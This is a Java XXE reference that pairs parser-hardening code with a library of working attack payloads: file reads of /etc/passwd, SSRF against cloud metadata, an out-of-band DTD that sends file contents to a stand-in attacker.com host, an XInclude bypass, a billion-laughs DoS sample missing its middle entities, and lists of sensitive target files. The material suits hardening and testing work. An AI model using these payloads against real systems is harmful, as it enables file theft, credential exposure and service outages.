# Java XXE Reference — Parser Hardening & Payloads

## Vulnerable Parsers by Default

| Parser | Default State | Hardening Required |
|--------|--------------|-------------------|
| `DocumentBuilderFactory` | Vulnerable | setFeature x3 + setXIncludeAware(false) |
| `SAXParserFactory` | Vulnerable | setFeature x3 |
| `XMLInputFactory` (StAX) | Vulnerable | setProperty x2 |
| `JAXB Unmarshaller` | Depends on underlying parser | Harden the source parser |
| `XStream` | Vulnerable | Security framework required |
| `XMLDecoder` | Vulnerable (RCE) | Never use with untrusted input |
| `dom4j SAXReader` | Vulnerable | Set XMLReader features |
| `JDOM SAXBuilder` | Vulnerable | setFeature on factory |
| `Woodstox` (used by Jackson) | Safe from 6.4.0+ | None required |
| `Jackson XmlMapper` (Woodstox) | Safe if Woodstox ≥ 6.4.0 | Check version |

## Complete Hardening Recipes

### DocumentBuilderFactory
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

### SAXParserFactory
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setXIncludeAware(false);
SAXParser parser = spf.newSAXParser();
```

### XMLInputFactory (StAX)
```java
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, Boolean.FALSE);
```

### XStream
```java
XStream xstream = new XStream();
XStream.setupDefaultSecurity(xstream);
xstream.allowTypesByWildcard(new String[] {"com.example.**"});
// Or use XStream 1.4.20+ which denies all types by default
```

### XMLDecoder
**Do not use with untrusted input. Ever.** It can execute arbitrary Java bytecode.
Migrate to Jackson, JAXB, or other safe alternatives.

## XXE Payload Library

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root/>
```
evil.dtd:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;
```

### Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### XInclude (Bypasses Entity Block)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Blocked by `setXIncludeAware(false)`.

## Windows File Targets
```
file:///c:/Windows/system32/drivers/etc/hosts
file:///c:/Windows/win.ini
file:///c:/boot.ini
```

## Unix File Targets
```
file:///etc/passwd
file:///etc/shadow    (if running as root)
file:///proc/self/environ
file:///proc/self/cmdline
/app/WEB-INF/web.xml
/app/application.properties  (application secrets)
```
